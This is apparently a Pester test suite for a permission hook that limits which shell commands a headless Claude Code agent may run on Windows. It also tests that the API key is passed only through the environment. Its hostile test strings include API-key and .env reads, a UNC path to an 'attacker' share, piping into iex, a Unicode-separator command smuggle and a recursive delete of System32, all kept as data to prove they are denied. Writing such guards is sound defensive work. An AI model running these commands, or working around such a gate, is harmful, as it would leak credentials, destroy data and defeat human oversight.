# tests/claude.Tests.ps1 -- online engine enforcement + orchestration (security core, CLAUDE.md section 5/6).
# Covers the pure/testable surface of lib/claude.ps1: the PreToolUse permission decision (the headless gate), the
# ADR-0006 runtime Get-* residual mitigation, Windows argv quoting, the hook settings object, and -- the key
# security property -- that Get-LokiClaudeInvocation puts the secret ONLY in the child env block, NEVER in argv.
# The raw subprocess spawn (Invoke-LokiClaude actually running `claude`) is NOT exercised here: it needs a working
# `claude` CLI + a real API key and is the pending live end-to-end gate (see docs/adr/0007).
Set-StrictMode -Version Latest

BeforeAll {
    . "$PSScriptRoot\..\src\lib\allowlist.ps1"
    . "$PSScriptRoot\..\src\lib\auth.ps1"
    . "$PSScriptRoot\..\src\lib\env-isolate.ps1"
    . "$PSScriptRoot\..\src\lib\claude.ps1"

    # A hijacking Get-* Function and Alias to prove the runtime mitigation downgrades a name that does NOT resolve
    # to a real Cmdlet (ADR-0006). Get-Item is a genuine Cmdlet used for the positive case.
    function global:Get-LokiFakeHijack { 'pwned' }
    Set-Alias -Name Get-LokiFakeAlias -Value Get-Item -Scope Global

    function global:New-HookJson {
        param([string]$Tool, $InputObj)
        $h = @{ hook_event_name = 'PreToolUse' }
        if ($PSBoundParameters.ContainsKey('Tool')) { $h['tool_name'] = $Tool }
        if ($null -ne $InputObj) { $h['tool_input'] = $InputObj }
        return ($h | ConvertTo-Json -Depth 6)
    }

    $script:RootTmp = Join-Path ([System.IO.Path]::GetTempPath()) ("loki-claude-" + [System.Guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Force -Path $script:RootTmp | Out-Null

    function global:New-TestClaudeAppRoot {
        $root = Join-Path $script:RootTmp ([System.Guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'home') | Out-Null
        return $root
    }
}

AfterAll {
    if (Test-Path -LiteralPath $script:RootTmp) { Remove-Item -LiteralPath $script:RootTmp -Recurse -Force -ErrorAction SilentlyContinue }
    Remove-Item Function:\Get-LokiFakeHijack -ErrorAction SilentlyContinue
    Remove-Item Alias:\Get-LokiFakeAlias -ErrorAction SilentlyContinue
    Remove-Item Function:\New-HookJson -ErrorAction SilentlyContinue
    Remove-Item Function:\New-TestClaudeAppRoot -ErrorAction SilentlyContinue
}

Describe 'Resolve-LokiCommandDecision (runtime Get-* residual mitigation, ADR-0006)' {

    It 'keeps a read whose Get-* first token resolves to a real Cmdlet' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-Item C:\Windows'
        $d.Class | Should -Be 'read'
        $d.Reason | Should -Be 'read-allowlisted'
    }

    It 'downgrades a Get-* name that resolves to a Function (hijack) to mutate' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-LokiFakeHijack'
        $d.Class | Should -Be 'mutate'
        $d.Reason | Should -Be 'read-downgraded-noncmdlet'
    }

    It 'downgrades a Get-* name that resolves to an Alias to mutate' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-LokiFakeAlias'
        $d.Class | Should -Be 'mutate'
        $d.Reason | Should -Be 'read-downgraded-noncmdlet'
    }

    It 'downgrades an unresolvable Get-* name to mutate' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-DefinitelyNotARealCmdlet12345'
        $d.Class | Should -Be 'mutate'
        $d.Reason | Should -Be 'read-downgraded-unresolved'
    }

    It 'does not apply the Get-* check to curated pure-read tools (ipconfig stays read)' {
        (Resolve-LokiCommandDecision -CommandLine 'ipconfig /all').Class | Should -Be 'read'
    }

    It 'passes a mutate through unchanged' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Remove-Item C:\x'
        $d.Class | Should -Be 'mutate'
        $d.Reason | Should -Be 'mutation-requires-confirm'
    }

    It 'passes a denied through unchanged' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Invoke-Expression $payload'
        $d.Class | Should -Be 'denied'
        $d.Reason | Should -Be 'denied'
    }
}

Describe 'Resolve-LokiCommandDecision - secret-target deny (adversarial review, ADR-0007)' {

    It 'blocks reading the process environment via the Env: drive' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem Env:'
        $d.Class | Should -Be 'denied'
        $d.Reason | Should -Be 'secret-target-blocked'
    }

    It 'blocks a targeted API-key env read' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-Item Env:\ANTHROPIC_API_KEY').Class | Should -Be 'denied'
    }

    It 'blocks reading the .env secret file (relative path -- claude cwd is AppRoot)' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-Content home\.env').Class | Should -Be 'denied'
    }

    It 'blocks reading the .env secret file (absolute path)' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-Content C:\loki\home\.env').Class | Should -Be 'denied'
    }

    It 'BREAK-THE-GUARD: a genuine read cmdlet cannot exfiltrate the key by pointing at Env:' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-Content Env:\ANTHROPIC_API_KEY').Class | Should -Not -Be 'read'
    }

    It 'still allows an unrelated read (the guard is targeted, not a blanket deny)' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem C:\Windows').Class | Should -Be 'read'
    }
}

Describe 'Resolve-LokiCommandDecision - side-effect/exfil deny (adversarial review, ADR-0007)' {

    It 'blocks Get-Help -Online (launches the default browser)' {
        $d = Resolve-LokiCommandDecision -CommandLine 'Get-Help Get-Process -Online'
        $d.Class | Should -Be 'denied'
        $d.Reason | Should -Be 'read-side-effect-blocked'
    }

    It 'never auto-allows a UNC path read (coerced SMB/NTLM auth -> credential leak): <cmd>' -ForEach @(
        @{ cmd = 'Test-Path \\10.0.0.5\share\x' }
        @{ cmd = 'Get-ChildItem \\10.0.0.5\share' }
        @{ cmd = 'Get-Content \\attacker\c$\loot' }
    ) {
        # The security property is "never read"; a clean UNC hits the side-effect deny, one with a '$' is already
        # mutate via the pure classifier -- both are blocked by the hook.
        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Not -Be 'read'
    }

    It 'a clean UNC read is denied specifically by the side-effect rule' {
        (Resolve-LokiCommandDecision -CommandLine 'Test-Path \\10.0.0.5\share\x').Reason | Should -Be 'read-side-effect-blocked'
    }

    It 'blocks non-space/tab whitespace riding along an otherwise-read command (Unicode separator)' {
        # U+2028 IS .NET whitespace, so the first token tokenizes cleanly to a real read cmdlet -> reaches the
        # read-enforcement control-char check, which blocks it.
        $sneaky = 'Get-Process' + [char]0x2028 + 'Remove-Item C:\temp\x'
        $d = Resolve-LokiCommandDecision -CommandLine $sneaky
        $d.Class | Should -Be 'denied'
        $d.Reason | Should -Be 'nonascii-control-blocked'
    }

    It 'blocks a control character in the arguments of an otherwise-read command' {
        # netstat is a pure-read command that takes any arguments, so the first token classifies as read and the
        # control char in the args is what the enforcement check must catch (ipconfig would already be mutate here).
        $d = Resolve-LokiCommandDecision -CommandLine ('netstat ' + [char]0x07)
        $d.Class | Should -Be 'denied'
        $d.Reason | Should -Be 'nonascii-control-blocked'
    }

    It 'still allows a normal read with plain spaces (no false positive)' {
        (Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem C:\Windows\System32').Class | Should -Be 'read'
    }
}

Describe 'Get-LokiPreToolUseDecision (headless permission gate, fail-closed)' {

    It 'allows a read-only Bash command (<cmd>)' -ForEach @(
        @{ cmd = 'ipconfig' }
        @{ cmd = 'ipconfig /all' }
        @{ cmd = 'Get-Item C:\Windows' }
        @{ cmd = 'netstat -ano' }
        @{ cmd = 'systeminfo' }
    ) {
        $json = New-HookJson -Tool 'Bash' -InputObj @{ command = $cmd }
        $d = Get-LokiPreToolUseDecision -HookInputJson $json
        $d.hookSpecificOutput.hookEventName | Should -Be 'PreToolUse'
        $d.hookSpecificOutput.permissionDecision | Should -Be 'allow'
    }

    It 'denies a non-read Bash command (<cmd>)' -ForEach @(
        @{ cmd = 'Remove-Item C:\x' }
        @{ cmd = 'Stop-Service spooler' }
        @{ cmd = 'ipconfig /release' }
        @{ cmd = 'ipconfig & del C:\x' }
        @{ cmd = 'Get-Content x | iex' }
        @{ cmd = 'Invoke-Expression $p' }
        @{ cmd = 'arp -a -d 10.0.0.1' }
        @{ cmd = 'Get-LokiFakeHijack' }
        @{ cmd = 'Get-ChildItem Env:' }
        @{ cmd = 'Get-Item Env:\ANTHROPIC_API_KEY' }
        @{ cmd = 'Get-Content home\.env' }
    ) {
        $json = New-HookJson -Tool 'Bash' -InputObj @{ command = $cmd }
        $d = Get-LokiPreToolUseDecision -HookInputJson $json
        $d.hookSpecificOutput.permissionDecision | Should -Be 'deny'
    }

    It 'denies a non-Bash tool (only Bash is gated/exposed)' {
        $json = New-HookJson -Tool 'Read' -InputObj @{ file_path = 'C:\secret.txt' }
        $d = Get-LokiPreToolUseDecision -HookInputJson $json
        $d.hookSpecificOutput.permissionDecision | Should -Be 'deny'
        $d.hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-tool-not-permitted'
    }

    It 'allows a read-only command via the PowerShell tool (the Windows shell tool)' {
        # Get-Process is a genuine Cmdlet, so it survives the runtime Get-* mitigation. NOTE: many Windows network
        # diagnostic Get-* commands (Get-NetIPConfiguration, Get-NetAdapter) are module *Functions*, not Cmdlets,
        # and are conservatively downgraded -- see the ADR-0007 pending-live note on this limitation.
        $json = New-HookJson -Tool 'PowerShell' -InputObj @{ command = 'Get-Process' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecision | Should -Be 'allow'
    }

    It 'GROUND TRUTH: allows a real read using the EXACT stdin Claude Code emits for the PowerShell tool (captured live 2026-07-15)' {
        # Verbatim from a live `claude -p ... --tools PowerShell --permission-mode default` run against
        # claude 2.1.147. Confirms the assumed contract: tool_name is exactly "PowerShell", the command lives
        # at tool_input.command (like Bash), and the extra fields Claude adds (transcript_path, effort,
        # tool_use_id, sibling tool_input.description) must not confuse the StrictMode-safe field reads.
        $json = '{"session_id":"475889ab","transcript_path":"C:\\Users\\veitc\\.claude\\x.jsonl","cwd":"C:\\Users\\veitc","permission_mode":"default","effort":{"level":"high"},"hook_event_name":"PreToolUse","tool_name":"PowerShell","tool_input":{"command":"Get-Date","description":"Get current date and time"},"tool_use_id":"toolu_011S3ZgKCbUKYuzptJ36cmx3"}'
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecision | Should -Be 'allow'
    }

    It 'denies a differently-cased/unknown tool_name (case-sensitive match to exactly Bash/PowerShell): <name>' -ForEach @(
        @{ name = 'bash' }, @{ name = 'BASH' }, @{ name = 'powershell' }, @{ name = 'Powershell' }, @{ name = 'PowerShell ' }
    ) {
        $json = New-HookJson -Tool $name -InputObj @{ command = 'ipconfig' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-tool-not-permitted'
    }

    It 'denies a Bash call with an empty/blank command' {
        $json = New-HookJson -Tool 'Bash' -InputObj @{ command = '   ' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecision | Should -Be 'deny'
    }

    It 'denies when tool_input is missing entirely' {
        $json = New-HookJson -Tool 'Bash' -InputObj $null
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-missing-command'
    }

    It 'denies when tool_name is missing' {
        $json = New-HookJson -InputObj @{ command = 'ipconfig' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-missing-tool-name'
    }

    It 'denies malformed JSON (fail-closed)' {
        (Get-LokiPreToolUseDecision -HookInputJson '{ this is not json').hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-malformed-hook-input'
    }

    It 'denies an empty hook input (fail-closed)' {
        (Get-LokiPreToolUseDecision -HookInputJson '').hookSpecificOutput.permissionDecisionReason | Should -Be 'loki-deny-empty-hook-input'
    }

    It 'BREAK-THE-GUARD: a destructive command can never come back as allow' {
        $json = New-HookJson -Tool 'Bash' -InputObj @{ command = 'Remove-Item -Recurse -Force C:\Windows\System32' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecision | Should -Not -Be 'allow'
    }

    It 'PROVE-IT-CAN-ALLOW: a plain read command does come back as allow (guard is not a constant deny)' {
        $json = New-HookJson -Tool 'Bash' -InputObj @{ command = 'ipconfig /all' }
        (Get-LokiPreToolUseDecision -HookInputJson $json).hookSpecificOutput.permissionDecision | Should -Be 'allow'
    }
}

Describe 'ConvertTo-LokiArgString (Windows CommandLineToArgvW quoting)' {

    It 'leaves argument-safe tokens unquoted' {
        ConvertTo-LokiArgString -ArgumentList @('a', 'b', 'c') | Should -Be 'a b c'
    }

    It 'quotes arguments containing spaces' {
        ConvertTo-LokiArgString -ArgumentList @('a', 'b c') | Should -Be 'a "b c"'
    }

    It 'escapes embedded double quotes' {
        ConvertTo-LokiArgString -ArgumentList @('d"e') | Should -Be '"d\"e"'
    }

    It 'doubles a trailing backslash run before the closing quote' {
        ConvertTo-LokiArgString -ArgumentList @('a b\') | Should -Be '"a b\\"'
    }

    It 'leaves a backslash path with no spaces unquoted' {
        ConvertTo-LokiArgString -ArgumentList @('C:\path\file') | Should -Be 'C:\path\file'
    }

    It 'emits "" for an empty argument' {
        ConvertTo-LokiArgString -ArgumentList @('') | Should -Be '""'
    }
}

Describe 'New-LokiHookSettingsObject' {

    It 'registers a PreToolUse hook on both shell tools invoking powershell.exe with the script path' {
        $s = New-LokiHookSettingsObject -HookScriptPath 'C:\loki\src\hooks\pretooluse.ps1'
        $entry = $s.hooks.PreToolUse[0]
        $entry.matcher | Should -Be 'Bash|PowerShell'
        $entry.hooks[0].type | Should -Be 'command'
        $entry.hooks[0].command | Should -Be 'powershell.exe'
        $entry.hooks[0].args | Should -Contain '-File'
        $entry.hooks[0].args | Should -Contain 'C:\loki\src\hooks\pretooluse.ps1'
    }
}

Describe 'Get-LokiClaudeCommand' {

    It 'returns an explicit override path when it exists' {
        $existing = "$PSScriptRoot\..\src\lib\claude.ps1"
        Get-LokiClaudeCommand -Override $existing | Should -Be $existing
    }

    It 'returns $null for a non-existent override path' {
        Get-LokiClaudeCommand -Override 'Z:\nope\claude.exe' | Should -BeNullOrEmpty
    }

    It 'prefers a native .exe over a .cmd shim when PATH carries both (multi-install robustness)' {
        # Real failure mode observed live 2026-07-15: a dead Volta `claude.cmd` sat ahead of a working WinGet
        # `claude.exe` on PATH. Selecting the first PATH entry would pick the broken shim; prefer the self-
        # contained .exe. -ParameterFilter keeps every other Get-Command call (Pester internals) real.
        Mock -CommandName Get-Command -ParameterFilter { $Name -eq 'claude' } -MockWith {
            @(
                [pscustomobject]@{ CommandType = 'Application'; Name = 'claude.cmd'; Source = 'C:\Volta\bin\claude.cmd' },
                [pscustomobject]@{ CommandType = 'Application'; Name = 'claude.exe'; Source = 'C:\WinGet\Links\claude.exe' }
            )
        }
        Get-LokiClaudeCommand | Should -Be 'C:\WinGet\Links\claude.exe'
    }

    It 'falls back to a .cmd shim when no .exe is present (npm-only install)' {
        Mock -CommandName Get-Command -ParameterFilter { $Name -eq 'claude' } -MockWith {
            @([pscustomobject]@{ CommandType = 'Application'; Name = 'claude.cmd'; Source = 'C:\npm\claude.cmd' })
        }
        Get-LokiClaudeCommand | Should -Be 'C:\npm\claude.cmd'
    }

    It 'returns $null when claude is not resolvable on PATH' {
        Mock -CommandName Get-Command -ParameterFilter { $Name -eq 'claude' } -MockWith { @() }
        Get-LokiClaudeCommand | Should -BeNullOrEmpty
    }
}

Describe 'Get-LokiClaudeInvocation (SECURITY: secret only in env, never in argv)' {

    BeforeAll {
        # An existing file stands in for the `claude` binary so path resolution succeeds without a real install.
        $script:FakeClaude = "$PSScriptRoot\..\src\lib\claude.ps1"
    }

    It 'places the secret in ChildEnv ANTHROPIC_API_KEY and NOT in the argument string' {
        $root = New-TestClaudeAppRoot
        $secret = 'sk-super-secret-should-never-be-in-argv-9876'
        $plan = Get-LokiClaudeInvocation -Prompt 'why is DNS slow' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret $secret

        $plan.Ok | Should -BeTrue
        $plan.ChildEnv['ANTHROPIC_API_KEY'] | Should -Be $secret
        $plan.ArgString | Should -Not -BeLike "*$secret*"
    }

    It 'BREAK-THE-GUARD: even an awkward secret (spaces/symbols) stays out of argv but is in env' {
        $root = New-TestClaudeAppRoot
        $secret = 'tok en "with" $weird chars'
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret $secret
        $plan.ChildEnv['ANTHROPIC_API_KEY'] | Should -Be $secret
        $plan.ArgString.Contains($secret) | Should -BeFalse
    }

    It 'builds the enforced headless argument set (PowerShell tool, default mode)' {
        $root = New-TestClaudeAppRoot
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret 'sk-x'
        $plan.ArgString | Should -BeLike '*-p*'
        $plan.ArgString | Should -BeLike '*--output-format json*'
        $plan.ArgString | Should -BeLike '*--permission-mode default*'
        $plan.ArgString | Should -BeLike '*--tools PowerShell*'
        $plan.ArgString | Should -BeLike '*--no-session-persistence*'
        $plan.ArgString | Should -BeLike '*--settings*'
    }

    It 'forces the PowerShell tool on in the child env (Windows shell tool is PowerShell, not Bash)' {
        $root = New-TestClaudeAppRoot
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret 'sk-x'
        $plan.ChildEnv['CLAUDE_CODE_USE_POWERSHELL_TOOL'] | Should -Be '1'
    }

    It 'writes a valid hook settings file, PreToolUse as a JSON array (5.1 must not collapse the single element)' {
        $root = New-TestClaudeAppRoot
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret 'sk-x'
        Test-Path -LiteralPath $plan.SettingsPath | Should -BeTrue
        # Assert the raw JSON shape, not just the parsed object: PS 5.1 ConvertFrom-Json collapses a 1-element array
        # so an indexed read would pass either way. The written file must have the array bracket for Claude Code.
        $plan.SettingsJson | Should -BeLike '*"PreToolUse":[[]*'
        $raw = Get-Content -LiteralPath $plan.SettingsPath -Raw
        $raw | Should -BeLike '*"PreToolUse":[[]*'
        $obj = $raw | ConvertFrom-Json
        $obj.hooks.PreToolUse[0].matcher | Should -Be 'Bash|PowerShell'
    }

    It 'short-circuits with auth-missing when no secret is available (no spawn)' {
        $root = New-TestClaudeAppRoot   # home\ exists but no .env
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude
        $plan.Ok | Should -BeFalse
        $plan.Reason | Should -Be 'auth-missing'
    }

    It 'short-circuits with claude-not-found when the binary cannot be resolved' {
        $root = New-TestClaudeAppRoot
        $plan = Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath 'Z:\nope\claude.exe' -Secret 'sk-x'
        $plan.Ok | Should -BeFalse
        $plan.Reason | Should -Be 'claude-not-found'
    }

    It 'resolves the model: default sonnet, config override, explicit override' {
        $root = New-TestClaudeAppRoot
        (Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -ClaudePath $script:FakeClaude -Secret 'sk-x').Model | Should -Be 'sonnet'
        (Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{ OnlineModel = 'opus' } -ClaudePath $script:FakeClaude -Secret 'sk-x').Model | Should -Be 'opus'
        (Get-LokiClaudeInvocation -Prompt 'q' -AppRoot $root -Config @{} -Model 'haiku' -ClaudePath $script:FakeClaude -Secret 'sk-x').Model | Should -Be 'haiku'
    }
}
